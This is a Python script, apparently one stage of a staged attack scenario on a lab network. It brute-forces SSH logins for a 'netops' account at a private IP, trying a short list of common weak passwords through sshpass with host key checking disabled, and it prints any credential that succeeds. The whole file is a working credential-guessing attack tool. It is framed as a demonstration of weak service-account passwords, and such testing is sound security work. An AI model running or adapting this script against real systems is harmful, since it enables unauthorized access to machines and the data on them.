#!/usr/bin/env python3
"""
Stage 7 — Unix Shell via Management SSH (brute-force variant)
Scenario 2: Subscriber Data Exfiltration

Goal: demonstrate that a low-privilege operational account with a
weak, guessable password grants shell access, even where the primary
admin account may be well-secured. Models the realistic scenario of
secondary/service accounts being neglected in credential hygiene.
"""

import subprocess
import sys

TARGET = "192.168.134.128"
USERNAME = "netops"

# A realistic small wordlist an attacker might try first - common
# "lazy admin" patterns rather than a full dictionary attack.
CANDIDATE_PASSWORDS = [
    "netops", "netops123", "Welcome123", "Summer2024!",
    "Password1", "ChangeMe123", "admin123", "P@ssw0rd",
    "Sim2024!", "Open5gs123",
]

def try_password(password):
    """Attempt SSH login with sshpass, return True if successful."""
    result = subprocess.run(
        ["sshpass", "-p", password, "ssh",
         "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=5",
         "-o", "PreferredAuthentications=password",
         f"{USERNAME}@{TARGET}", "echo AUTH_OK"],
        capture_output=True, text=True
    )
    return "AUTH_OK" in result.stdout

def main():
    print(f"[*] Stage 7 - SSH credential test against {USERNAME}@{TARGET}")
    for pw in CANDIDATE_PASSWORDS:
        print(f"[*] Trying: {pw}")
        if try_password(pw):
            print(f"[+] SUCCESS: {USERNAME}:{pw}")
            sys.exit(0)
    print("[-] No candidate password succeeded.")

if __name__ == "__main__":
    main()
